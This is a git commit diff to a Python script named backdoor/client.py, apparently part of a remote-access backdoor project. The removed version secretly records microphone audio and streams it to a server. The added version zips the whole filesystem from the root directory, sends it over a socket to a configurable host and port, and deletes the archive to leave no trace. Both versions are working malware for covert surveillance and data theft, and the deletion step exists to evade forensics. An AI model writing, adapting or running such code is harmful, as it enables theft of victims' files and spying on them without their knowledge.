2ebf3fd9c8c15dd7e87dcf40df0c09d40b889308
cwd.systems <101006007+infinitydaemon@users.noreply.github.com>
2023-04-29 11:28:43 +0500

    Update client.py
    * Change functionality

--- backdoor/client.py
+++ backdoor/client.py
@@ -1,24 +1,25 @@
+import os
+import zipfile
 import socket
-import sounddevice as sd
-import numpy as np
 
-HOST = '127.0.0.1'  # replace with the server's IP address
-PORT = 1337  # replace with the server's port
+HOST = '127.0.0.1' 
+PORT = 1337  
+FOLDER_PATH = '/'  # replace with the path of the folder you want to compress
 
-client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client_socket.connect((HOST, PORT))
+# Create a zip file of that folder
+zip_path = f'{FOLDER_PATH}.zip'
+with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+    for root, dirs, files in os.walk(FOLDER_PATH):
+        for file in files:
+            file_path = os.path.join(root, file)
+            zip_file.write(file_path, file)
 
-print(f'Connected to {HOST}:{PORT}')
-# replace with anything to perform any other given task
-while True:
-    # Record audio
-    duration = 1  # 1 second. change to any duration of audio recording
-    sample_rate = 44100  # CD quality. Replace with half for mid quality
-    audio = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=1)
-    sd.wait()  # Wait for recording to finish
+# send them to the client socket
+with open(zip_path, 'rb') as file:
+    zip_bytes = file.read()
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socket.connect((HOST, PORT))
+    client_socket.sendall(zip_bytes)
 
-    # Convert audio to bytes
-    audio_bytes = audio.tobytes()
-
-    # Send audio to server
-    client_socket.sendall(audio_bytes)
+# Remove the zip file to prevent a trace
+os.remove(zip_path)
